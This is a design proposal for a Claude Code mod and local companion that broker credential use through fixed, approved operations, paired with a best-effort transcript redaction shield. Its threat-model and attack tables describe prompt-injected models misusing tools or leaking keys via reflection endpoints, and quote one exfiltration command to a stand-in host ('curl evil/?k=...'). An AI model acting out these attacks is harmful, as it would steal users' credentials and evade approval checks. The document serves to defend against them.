# Pi proposal: Hatch, a secret-use broker with a transcript shield

Independent proposal for discussion with Claude. Design only. No upstream code is copied. The sources are the nine local files under `docs/mods/`, `AGENTS.md`, and the four upstream files named in `brief.md`, at upstream commit `4ee4b4c`. All API claims below refer to those local documents, not to fetched pages or generated declarations.

## Recommendation

Replace “a placeholder that becomes a secret anywhere” with “a named operation that may use one credential in one defined way”. Claude asks for an outcome, not for a key. The user connects a credential outside the conversation, then authorises a specific operation. No placeholder ever restores into Bash, Write, Edit, another tool, or a file. Redacted text is inert text, not authority.

Use a mod as the control plane and a small local credential companion as the secret-bearing plane. The companion owns secure input, credential storage, request construction and response reduction. The mod owns discovery, confirmation, inventory and a best-effort transcript shield. A companion is not an optional architectural flourish: the supplied docs have no password field, keychain API, or documented private per-process stdin/environment facility. A pure-mod implementation cannot honestly promise the secure collection and constrained execution proposed here.

The target user is a developer who needs Claude to check or exercise a credential-backed integration without putting the credential into chat, source files or command lines. Start with test credentials and one read-only integration check. This is not a replacement for the application's production secrets manager, and it makes no HIPAA, PCI-DSS or GDPR certification claim.

## Directions considered

| Direction | Value | Why accept or reject |
| --- | --- | --- |
| Better redaction plus plaintext `.env` | Easiest integration with existing apps | Reject as the default. It still leaves repository-readable plaintext and cannot reliably prevent later publication. |
| Restore into arbitrary tools after confirmation | Familiar secret-box workflow | Reject. It makes the model's string a credential-bearing program, even when the model is following an injected instruction. |
| Start arbitrary commands with injected environment variables | Runs existing apps unchanged | Useful later, but not a safe secret-use boundary. The program can read, encode, write or send its environment. Repository code may have changed since approval. The supplied API docs also do not confirm per-child environment injection. |
| Generic authenticated HTTP proxy | Flexible integration testing | Reject in v1. Even an allowlisted host can expose destructive endpoints, attacker-controlled objects or reflection endpoints. |
| Fixed credential-backed operations with typed results | Less flexible, but a smaller security contract | Recommend. The credential has a specific recipient and a specific purpose, not a general substitution rule. |
| Shield-only mod, with all credential use outside Claude | Smallest docs-backed fallback | Keep as the fallback if companion integration cannot be verified. It must be marketed as accidental-exposure reduction, not a vault. |

## Threat model

### Assets and boundaries

Assets are credential values, the authority those credentials grant, provider responses that can contain personal data, and the integrity of user approvals. Aliases and operation history can also reveal sensitive project information, so they are local session metadata rather than telemetry.

The trust boundaries are:

1. User input versus the Claude transcript. Raw credentials must not cross it.
2. Model-controlled text, fetched pages, repository files and tool results versus a permitted credential operation. All of these are untrusted, even when a trusted tool delivers them.
3. The mod versus the companion. Only a bounded operation descriptor crosses this boundary, never a secret value.
4. The companion versus the credential provider and remote service. Credential resolution and HTTPS request construction happen here.
5. The companion's untrusted remote response versus the model. Reduce the response to a reviewed schema before returning anything.
6. Claude Code versus other installed mods and host tools. Mods are trusted host code, not sandboxed extensions.

Boundary 6 is explicitly documented: `docs/mods/overview.md`, “Decide whether to trust a mod / What a mod can reach”. Mods can read secrets, modify sessions and start processes outside Claude's Bash sandbox. `docs/mods/build/react-to-events.md`, “The order mods run in”, also says an earlier mod can see an event before this mod can protect it.

### Adversaries and promises

| Adversary or failure | Contract |
| --- | --- |
| User accidentally pastes a recognised key in chat | Shield rewrites it before forwarding, on the covered path. It cannot erase clipboard managers, terminal capture or earlier hooks. |
| Innocent model prints a credential from a file or tool | Shield redacts recognised textual values on covered paths. Unknown formats and non-text media remain a limitation. |
| Prompt-injected model tries Hatch's tools with an arbitrary destination or command | Reject by schema and fixed operation policy. No arbitrary URL, shell, code, header, output path or environment mapping is accepted. |
| Model repeats an approved operation or swaps its arguments | Approval is one-use and bound to the complete validated descriptor. Each later use needs a new approval. |
| Model has unrestricted same-user Bash, filesystem and process access | No containment promise. It may reach a provider directly, modify executable code or configuration, or attack the companion. Host permissions and provider access controls must enforce the wider boundary. |
| Malicious installed mod, compromised helper, compromised OS or same-user malware | Out of scope. These components can observe or alter the relevant inputs and actions. |
| User approves an undesirable but accurately described action | Not prevented. Good confirmation is risk reduction, not proof of sound intent. |

Do not say “Claude can never steal a secret” or “secrets never enter the transcript”. Say “Hatch never intentionally supplies raw credentials to Claude or its tools. Its shield reduces accidental exposure on specified text paths.”

## Architecture

### Components and data placement

| Component | Holds | Never holds |
| --- | --- | --- |
| Mod module variables | Session aliases, operation descriptors, pending request ids, bounded session activity, detector state | Newly enrolled raw credentials, decrypted provider values, persistent audit bodies |
| Companion private memory | Credential material during the exact operation, transient authentication headers and raw response | An open-ended model interpreter or arbitrary shell command |
| OS credential store | Persistent credential, selected and enrolled by the user | Project source or prompt content |
| Companion-owned policy | Credential alias to provider binding and fixed adapter policy | A general allowlist that repository code can silently broaden |
| Claude transcript | Alias, operation name, approval outcome, deliberately small typed result, inert redaction markers | Raw credentials or reusable credential-use tickets |
| `$.store` | Optional fixed-key numeric totals and timestamps only | Secrets, aliases, file paths, tool inputs, outputs, policy or per-secret hashed names |
| Project directory | At most application code that reads normal environment names, or a separately requested template with dummy values | Automatically written `.env`, credential material, helper state or grants |

Module variables reset on reload. We deliberately lose all pending grants on reload rather than preserve them in `$.state`. See `docs/mods/build/draw-in-the-interface.md`, “Keep state”. `$.store` is a shared JSON file, not a secure vault, and read/modify/write is not atomic. See that file's “Keep state” and “Save from more than one session”, plus `AGENTS.md`, “Conventions”. The simplest v1 uses no persistent store at all.

OS credential APIs, helper packaging, ACLs, process authentication, signing and persistent private policy storage are UNVERIFIED by the supplied docs. Start with macOS only if those facilities are proven. Do not invent cross-platform keychain parity. Do not use `security ... -w SECRET`, a shell command, or a helper argument to import a credential.

### Minimal operation model

An installed adapter defines the executable behaviour. User enrollment binds a local alias, such as `billing-test`, to a provider entry and an adapter's operation. V1 supports an operation such as “check test credential authentication”, whose result is only `authenticated`, `rejected`, `unavailable` or `cancelled`. Avoid balance amounts, account names, remote messages and full JSON responses in the first slice.

Each adapter fixes:

- HTTPS scheme, exact canonical origin, allowed method and endpoint.
- How the credential is attached, never as query text or URL userinfo.
- A small schema for any non-secret parameters, with no arbitrary request body in v1.
- No redirects. No automatic credential forwarding or retries with changed targets.
- Response size and duration limits, and a tiny typed projection of the response.
- The assurance label shown to the user, including whether an operation spends money or changes remote data.

Host allowlisting alone is insufficient. An operation must not accept a model-selected callback URL, redirect target, webhook, package name, account destination or remotely reflected string that turns it into a secret oracle. Review provider-specific response and auth behaviour before declaring the adapter safe.

This is proposed companion behaviour, not a claimed mods API feature. TLS, URL canonicalisation, redirect refusal, provider credential scoping and response reduction are UNVERIFIED until the companion platform and provider documentation are examined in a later authorised phase. The mod's documented `$.http.fetch` follows up to five redirects, so it is not the chosen credential-bearing transport. See `docs/mods/build/use-the-mods-api.md`, “Reach files, processes, and the network”, and `docs/mods/reference.md`, “Limits”.

### Flow with no busy wait

1. A custom `secret_operation` tool advertises only installed operation ids and non-secret arguments. Register it at `session.start`, with a JSON Schema, and handle its full `mcp__hatch__secret_operation` name through `tool.call`. See `docs/mods/build/use-the-mods-api.md`, “Add a command or a tool / Add a tool”. Tool names are tentative and must be checked for collisions later.
2. If the alias is unbound, the tool returns immediately: “Credential not connected. Run /secrets to connect it, then retry.” It does not wait for input, open a hidden pane, or return a restoration token.
3. `/secrets` is a direct user command that opens the inventory pane and returns `{}` so no inventory content is automatically printed to the model. Register with `$.command.register` and handle `command.run`. `immediate: true` permits opening it during a turn. See `docs/mods/build/use-the-mods-api.md`, “Add a command”.
4. A user-selected Connect action asks the companion to open its own secure enrollment interface or provider chooser. No `Input` receives a raw key in the mod. The companion reports only connected/cancelled/unavailable. The launch uses `$.process.run` with a fixed executable and non-secret argument list, no shell. See `docs/mods/build/use-the-mods-api.md`, “Reach files, processes, and the network”. Passing a secure UI context and the companion's structured protocol are UNVERIFIED.
5. A valid bound operation presents a readable confirmation through `$.ui.ask`. The default is Refuse. The question names the alias, exact operation, recipient, effects and one-use scope. Only an exact allowed answer proceeds. Dismissal, free text, no surface and any exception refuse. Time awaiting this API call does not count as the hook's own runtime. See `docs/mods/build/react-to-events.md`, “Hold a tool call until the user decides”, and `docs/mods/reference.md`, “Limits”. `$.ui.ask` is not used to collect a secret, since its free-text answer is not a password channel.
6. Validate and freeze the complete operation descriptor before confirmation. Bind the decision to those exact bytes. Consume it before dispatch. Refuse concurrent use of the same pending descriptor. Do not keep a session-wide “always allow” grant.
7. The companion resolves the alias and runs the fixed adapter. Its invocation carries no credential or reusable grant in argv. Its output is bounded non-secret structured status, and no raw stderr is forwarded. A random request id is for deduplication, not permission. Companion crash recovery must never replay an uncertain operation automatically.
8. The model receives the typed summary. A session activity item records alias, operation, recipient, time and outcome, but not arguments, request bodies or raw responses. Any later retry gets a new approval.

`$.process.run` supports an argv array without shell interpretation, has a 30 second default timeout and a 10 minute maximum, and resolves even for non-zero exit codes. It rejects on start failure or timeout. See `docs/mods/build/use-the-mods-api.md`, “Reach files, processes, and the network”, and `docs/mods/reference.md`, “Limits”. Whether a companion UI can safely remain open and be cancelled through this method is UNVERIFIED. Do not substitute sleep loops to make it work. If enrollment cannot fit a documented bounded launch, require the user to enroll externally and use the mod only to refresh status.

All helper calls are outside Claude's Bash sandbox. Confirmation here is a separate Hatch authorisation, not Claude Code permission approval. Do not return `tool.check: allow`, loosen permission rules or imply that ordinary Bash permission prompts cover these operations. See `docs/mods/overview.md`, “What a mod can reach”, and `docs/mods/build/react-to-events.md`, “Approve or refuse a tool call before the user is asked”.

## UI and UX

### A credible input experience

The inventory does not have a key field. It says “Connect in the credential provider. Do not paste a key into chat.” The supplied `Input` props have no password mode. Replacing visible text with dots in `onInput` cannot promise no-frame exposure, correct mid-field editing or an inaccessible-to-other-mods input channel. Other mods explicitly see `ui.input`. See `docs/mods/reference.md`, “Elements”, and `docs/mods/build/draw-in-the-interface.md`, “Respond to presses and typing / Which controls need a key”. The upstream `register.jsx`, `drawBox`, demonstrates the failure rather than an API to adopt.

A companion's secure input needs native password semantics from its platform, no command-line value, no one-frame reveal, correct insertion/deletion/paste, explicit cancel, and no logging. Those behaviours and its screen-reader support are UNVERIFIED. If not available, enrollment stays in the existing credential manager's own UI. Do not replace it with a custom mod mask.

### Inventory and confirmation

Show human-selected aliases and status, not value prefixes, suffixes, hashes or exact lengths. Even a truncated secret is still secret data. Use four plain-text states: Connected, Needs connection, Locked, Unavailable. Do not label locally disconnected credentials Revoked, since remote credentials may remain valid.

The narrow view is one vertical stack:

> Hatch: secret operations\n
> billing-test\n
> Connected for: check authentication\n
> Recipient: api.provider.example\n
> Writes: none. Scope: one approved use.\n
> [Check authentication] [Disconnect] [Close]

The example hostname is illustrative, not an approved adapter target.

Use `Box`, `Text`, `Button` and, for non-secret labels only, `Input` or `Select`, resolved through `$.ui.resolve(e)` in `ui.render`. Open a user-invoked pane with `$.ui.open`, and close with `$.ui.close`. Size layouts from `e.props.bodyColumns`, not whole-screen width, and reflow the action row into separate rows below about 60 columns. Avoid hard-coded minimum width and horizontally clipped approval text. See `docs/mods/build/draw-in-the-interface.md`, “Pick where to draw”, “Build a tree from elements” and “Open a pane at the right time”, plus `docs/mods/reference.md`, “Render sites”.

A model-triggered tool must not require an automatically opened pane. Unrequested panes wait below 144 columns, or 110 after a user has opened them. A user command opens at any width. The band can be collapsed without the mod knowing, so it must not be the only place to answer. See `docs/mods/build/draw-in-the-interface.md`, “When a pane waits for a wider terminal” and “When the user collapses the band”.

### Accessibility requirements

- Every state and warning is text, not colour or an icon alone. Use theme defaults and no dim text for security-critical facts.
- Order controls logically, name actions explicitly, and give each control a stable key. Tab, Enter and Esc remain the platform defaults. Show available hotkeys in labels only where they work. See `docs/mods/build/draw-in-the-interface.md`, “Keyboard focus and hotkeys”.
- Open with `focus: true` and `closeOnEscape: true` on direct user action, but do not assume focus was granted. The terminal will not steal focus from typed text. See “How a pane gets keyboard focus” and “Open a pane at the right time” in the same file.
- In VS Code do not depend on hotkeys, `autoFocus`, or multi-row Input. Use labelled buttons and wrapping text. See that file's “Draw in the VS Code extension” and `docs/mods/reference.md`, “Elements”.
- Below a usable pane width, keep a short text status and let the user choose an external credential-manager workflow. No secret entry fallback in the prompt.
- Screen-reader announcements, password field semantics, host high-contrast behaviour and focus restoration are UNVERIFIED in the supplied docs. They are release tests, not claims. Avoid animations and time-limited security instructions.

`$.ui.status` can give a persistent generic notice such as “Hatch needs a credential. Run /secrets”. A toast is supplemental only. No key names, account identifiers or secret fragments in OS notifications. See `docs/mods/build/use-the-mods-api.md`, “Show something without starting a turn”. Do not automatically submit prompts after connection.

## The transcript shield

Treat shielding and permission as independent. A string hidden by the detector does not become available for use by the broker. Only user-enrolled credentials can authorise operations. Markers are inert, for example `[SECRET REMOVED]`, with no reverse map. A copied marker, including one from a file, is never executable authority. There is no LIVE versus LITERAL restoration system.

Use an independently written, small detector library with ordered evidence: exact known values only if explicitly learned through a separately approved workflow, private-key blocks, a small reviewed set of vendor formats, and credential-bearing field contexts. Entropy is an optional conservative signal, not proof. The companion does not export a credential to improve matching. Consequently a short unknown password printed without context can be missed. State that limit plainly instead of loading every project `.env` automatically.

Cover the following documented paths with explicit adapters, not an unbounded recursive “rewrite anything” promise:

| Path | Intended intervention | API source |
| --- | --- | --- |
| `prompt.submit` | Scan text and any attached context before `next`. Rewrite or drop. | `docs/mods/build/react-to-events.md`, “Rewrite or add to a prompt”. |
| `tool.call`, every tool including subagents and MCP | Refuse recognised raw secrets in outward tool arguments before dispatch. Scan recognised text results, denial text and declared context after `next`. Never restore. | Same file, “Guard or change a tool call”. Exact result fields require generated types before implementation. |
| `prompt.context`, `prompt.section`, `prompt.attachment`, `skill.prompt` | Scan text blocks supplied to the model. Withhold on failure. | `docs/mods/reference.md`, “Prompts and what Claude reads”. |
| `prompt.mention` | Refuse secret-file classes and any readable text attachment with a recognised credential. Unscannable input is not declared safe. | `docs/mods/reference.md`, “Prompts and what Claude reads”. Reading for inspection uses `$.fs.read`, cited under “Mods API methods”. |
| `agent.spawn` | Refuse a prompt containing recognised credentials rather than depend on unconfirmed prompt rewriting fields. | `docs/mods/reference.md`, “Subagents”. |
| `session.send` and `session.receive` | Refuse recognised raw credentials in outgoing/incoming message text. | `docs/mods/build/use-the-mods-api.md`, “Send and receive messages between sessions”. |
| `session.append` | Additional scan of documented text blocks before a row is stored. | `docs/mods/reference.md`, “Session”. |

`session.append` is not a universal final model-request hook. The docs say it precedes storage of a row, not that it intercepts every outbound payload or every host log. `turn.step` does not document rewriting the whole message history, and `$.session.messages()` returns at most 4,096 recent entries. Do not claim retroactive cleanup or complete request coverage from either. See `docs/mods/reference.md`, “Turns”, “Session” and “Limits”.

The exact typed failure result for each path must be verified. A defensive `.catch` is essential, but it is not an unbreakable fail-closed system. At `tool.call`, a failure after the tool ran can withhold the result but cannot reverse a network send or disk write. If the catch handler itself fails, the engine skips the hook. See `docs/mods/build/react-to-events.md`, “Handle a hook that fails”. Keep catch handlers synchronous and constant-shaped where possible, with generic text and no thrown error or input interpolation. UNVERIFIED: which text-supply events allow an empty or refusal result in the installed build.

Bound scans by cumulative bytes, structure depth and time, and refuse or withhold unsupported text-bearing structures instead of passing through a partially scanned result. Object keys can themselves contain credentials, so scanning string values alone is incomplete. Media, binary, screenshots, PDF pages, live progress output and opaque server-side tool calls are not covered without separate proof. `docs/mods/build/react-to-events.md`, “Follow a turn”, explicitly says server-side tool uses do not fire `tool.call` or `tool.check`.

The shield neither proves a command safe nor reliably stops an encoded secret from leaving over the network. Blocking recognised credentials in Write/Edit is useful accidental-leak prevention, but arbitrary programs, MCP tools and scripts have other disk and network paths. Do not add increasingly elaborate git-command regexes as a substitute for secret scanning in the actual publishing pipeline.

## Security analysis

| Attack | Outcome in this design |
| --- | --- |
| Fetched page asks Claude to run `curl evil/?k=[marker]` | Marker stays literal. No key restoration exists. This closes upstream's direct placeholder-to-Bash path. |
| Claude places a marker in a tracked source file | Marker remains literal. Hatch writes no secret to source, closing upstream's Write/Edit restoration path. |
| Model asks `secret_operation` to run a shell or choose a URL | Refused. Neither exists in the schema or companion protocol. |
| Model swaps a destination after approval | Descriptor is immutable and approval is consumed for that exact operation. The companion revalidates policy at dispatch. Verification gate remains for the helper protocol. |
| Model chooses a provider reflection endpoint to print the key | Not available in fixed adapters. Raw responses never return. A badly designed adapter can still create this vulnerability, so adapters need adversarial tests. |
| Model repeatedly tests whether secret characters satisfy a condition | No arbitrary predicate or program is allowed. A provider may still reveal limited information through fixed statuses or timing. Rate limits and small fixed results reduce, not eliminate, that channel. |
| A script, Git alias, alternate Git command or package publish bypasses a `.env` regex | No regex-based publication guarantee is made. No `.env` is created, but unrelated existing secrets still need publishing-time scanning. |
| Value contains `$`, quotes, backticks or newlines | No shell or dotenv serialization occurs. Credential bytes stay within the provider and companion. Provider support for multiline secrets is separately UNVERIFIED. |
| Attacker replaces a helper, adapter or policy file after approval | Must refuse on identity/policy mismatch. Tamper-resistant installation and atomic validation are UNVERIFIED and required before an adversarial-model claim. Same-user arbitrary code remains outside containment. |
| Tool outputs an unknown short password or credential in an image | May leak through the shield. Not prevented. No completeness claim. |
| Model can directly query the user's keychain with unrestricted Bash | Not prevented by a mod. Provider ACLs and host permissions must separately prevent it. |
| Earlier installed mod observes secure-looking UI input | No raw secret uses mod input, but a malicious mod remains fully trusted host code. No co-residency security claim. |
| Hook unloads, worker crashes or mods are disabled | Broker availability is lost, not credential access intentionally widened. The passive shield may disappear. The engine can unload all user mods after repeated worker crashes. See `docs/mods/test-and-troubleshoot/troubleshoot.md`, “A hook is skipped or a mod is unloaded”. |
| Provider call completed but helper response was lost | Return Unknown outcome, not success or automatic retry. No replay of an uncertain operation. Read-only v1 limits harm. |

Disconnect removes the local binding and cancels future grants. It does not erase an already sent remote request, kill every possible credential-bearing descendant, or revoke a remote key. A Rotate action should provide fixed provider instructions, not claim rotation succeeded. Actual revocation/rotation adapters are a separate high-risk feature.

Do not persist detailed activity or raw detector findings. A session list is a convenience, not a tamper-proof regulatory audit. No telemetry, no model-based detection, no `$.model.*` call and no network validation of a key without explicit operation approval.

## Useful features without broadening authority

Core: connect an existing credential, check whether it is usable through one fixed read-only operation, show aliases and supported operations, disconnect, and show bounded session activity. Missing-secret requests tell the user exactly what action is needed without soliciting chat input.

Small subsequent additions: a local setup check that confirms a binding exists without testing the remote key, test-versus-production labels selected by the user and validated by an adapter where possible, and a developer handoff explaining the environment variable the application expects. A test label alone must never be treated as proof of a provider-side limited credential.

Potential later “run this app” mode must be named Uncontained program access, not protected execution. It needs explicit approval of executable, cwd, complete arguments, environment mapping, output policy and mutable code risk. Do not ship it merely because env injection sounds safer than string restoration. The process receives the key and can do anything its permissions allow.

No v1 dotenv importer/exporter, generic proxy, arbitrary command runner, automatic provider account discovery, universal PII detector, persisted activity database, recursive secret crawling, browser extension, clipboard feature, remote helper or automatic rotation.

## Evidence and release gates

The immediate output is a design, not a claim that these controls have been implemented or tested.

Before coding, inspect generated declarations for the exact target Claude Code build. The docs expressly say generated types outrank pages: `docs/mods/create-a-mod.md`, “Get type definitions for your version”. Load the built-in `plugin-authoring` skill at that stage, as `AGENTS.md`, “Change a mod”, requires.

Blocking feasibility gates:

1. Prove companion enrollment can happen with no credential in the mod API, argv, stdout, stderr or debug logs. Prove it is accessible. If not, use existing provider UI, not custom masking.
2. Prove companion invocation, private policy ownership and credential-provider ACLs under the actual host permission model. Do not assert protection from unrestricted same-user code.
3. Verify cancellation, timeout, close, helper crash, UI detach, concurrent calls, reload and `/clear`/`resume`/`branch` invalidate outstanding grants. `session.end` includes those reset commands, and its total hook budget is short. See `docs/mods/reference.md`, “Session” and “Limits”. Expiry is checked at use time, not dependent on a timer or final cleanup hook.
4. Verify exact event input/result shapes and logging/transcript placement with fake secrets. The supplied docs do not establish that every byte is intercepted before every persistence path.
5. Verify the first fixed operation against the provider's official API and transport behaviour in a later phase with network research authorised. No such calls were made for this design.

Write pure detector/policy tests and thin-hook tests before implementation. Use `claude-code/testing` stubs for `process.run`, tool calls, UI and clock, so tests use only fake credentials and no live model or network. Test malformed descriptors, encoded values, tool denial strings, deep structures, output limits, disabled hooks and another mod's rewrites. See `docs/mods/test-and-troubleshoot/test.md`, “Write a test”, “Stub what Claude Code would answer” and “Follow the test kit's rules”.

Mount pane tests for terminal, Desktop and VS Code at 40, 60 and 120 columns, with missing viewport information and keyboard-only actions. The kit validates structure but not real painting, so manual accessible-UI tests are still required. See that file's “Test a drawing”. Run `claude plugin test`, `claude plugin validate --strict .`, and the repository Biome check prescribed by `AGENTS.md`. No live `$.model.*` run is needed or permitted without the owner's approval.

## Decision to take into the brainstorm

Agree first that possession of a placeholder must never grant access to a credential. Build around approved outcomes and inert redaction. If a safe companion is too much scope, ship an honestly labelled transcript shield first rather than recreate a vault that silently restores keys into arbitrary programs.
